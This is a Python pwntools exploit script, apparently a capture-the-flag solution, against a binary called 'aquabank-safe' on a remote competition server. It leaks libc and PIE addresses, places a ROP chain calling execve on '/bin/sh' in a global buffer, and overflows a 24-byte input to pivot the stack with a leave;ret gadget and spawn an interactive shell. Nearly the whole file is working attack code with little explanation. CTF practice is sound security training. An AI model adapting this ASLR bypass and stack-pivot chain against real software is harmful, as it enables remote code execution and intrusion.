#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./aquabank-safe', checksec=False)
context.arch = 'amd64'
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

RIP_OFFSET = 17

#p = process(elf.path)
p = remote("offsec.m0lecon.it", 13584)
rop = ROP(libc)


p.recvuntil(b'>')
p.sendline(b'1')
data = p.recvuntil(b"> ")
lines = data.split(b"\n")
printf_leak = int(lines[0].split(b"@ ")[1], 16)
entry_leak = int(lines[1].split(b"@ ")[1], 16)

pie_base = entry_leak - elf.symbols['diagnostics']
print(hex(pie_base))
#print(hex(printf_leak))
#print(hex(entry_leak))
libc_base = printf_leak - libc.sym['printf']
#print(hex(libc_base))

pop_rdi = libc_base + rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = libc_base + rop.find_gadget(['pop rsi', 'ret'])[0]
#pop_rdx = libc_base + rop.find_gadget(['pop rdx', 'ret'])[0]
pop_rdx = libc_base + 0x00000000000ab8a1
#pop_rax = libc_base + rop.find_gadget(['pop rax', 'ret'])[0]
#xchg    = libc_base + rop.find_gadget(['xchg rdx, rax', 'ret'])[0]
#xor_rsi = libc_base + rop.find_gadget(['xor rsi, rsi', 'ret'])[0]
ret = libc_base + rop.find_gadget(['ret'])[0]
#bin_sh = libc_base + next(libc.search(b'/bin/sh'))
#system = libc_base + libc.symbols['system']
bin_sh = pie_base + elf.symbols['vault']
execve = libc_base + libc.sym['execve']
#print(hex(execve))
writable = libc_base + libc.bss()
pop_rcx = libc_base + 0x00000000000a877e
leave_ret = libc_base + 0x00000000000299d2

#p.recvuntil(b'>')
p.sendline(b'2')
p.sendlineafter(b"deposit size", b"8")
p.send(b"/bin/sh\x00")
vault_addr = pie_base + elf.symbols['vault']
#print(hex(vault_addr))
#gdb.attach(p)





#p.sendline(b'3')
#p.recvuntil(b"[safe] Enter the 24-byte combination:")
bin_sh_offset = 0  # /bin/sh will be at vault_addr + 0
bin_sh = vault_addr + 0

rop_chain = flat (
        b'/bin/sh\x00',  
        p64(ret), 
        p64(pop_rdi), p64(bin_sh),
        p64(pop_rsi), p64(0),
        p64(pop_rcx), p64(writable + 0x10),  # rcx - 0xa points into writable bss
        p64(pop_rdx), p64(0),                 # side effect writes to bss, harmless

        p64(execve)
        
        )
p.sendline(b'2')
p.sendlineafter(b"deposit size", str(len(rop_chain)).encode())
p.send(rop_chain)


p.sendline(b'3')
p.recvuntil(b'combination:')
payload = flat(
    b'A' * 8,               # fill buf
    p64(vault_addr),        # saved rbp — leave will set rsp here
    p64(leave_ret)          # rip — triggers pivot
)
# payload is exactly 24 bytes
p.send(payload)

#print(f"Payload length: {len(payload)}")
#p.sendline(payload)
#p.recv(timeout=2)
#p.recvline()
p.interactive()



